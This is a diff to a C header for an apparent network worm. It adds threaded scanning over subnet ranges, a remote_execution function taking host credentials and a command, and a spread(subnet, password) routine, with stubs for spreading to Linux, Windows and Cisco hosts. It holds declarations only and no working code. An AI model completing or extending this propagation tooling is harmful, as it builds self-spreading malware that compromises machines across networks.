@@ -1,12 +1,15 @@
 #ifndef net_H
 #define net_H
 
+#include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdbool.h>
 #include <string.h>
 #include <errno.h>
 #include <unistd.h>
 
+#define NUM_THREADS 16 // Number of worker threads
 
 #define MAX_BUF_SIZE 1024
 #define MAX_COMMAND_SIZE 256
@@ -37,11 +40,17 @@ enum os_type {
     CISCO
 };
 
+struct thread_data {
+    const char* subnet;
+    const char* password;
+    int start;
+    int end;
+};
 
 enum os_type get_os_type(const char *ip_address);
-char* establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os);
-void spread_linux(const char* host, const char* username, const char* password);
-
+char* remote_execution(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os);
+// void spread_linux(const char* host, const char* username, const char* password);
+void spread(const char* subnet, const char* password);
 // static void spread_linux(const char* host, const char* username, const char* password, const char* command);
 
 // static void spread_windows(const char* host, const char* username, const char* password, const char* command); 
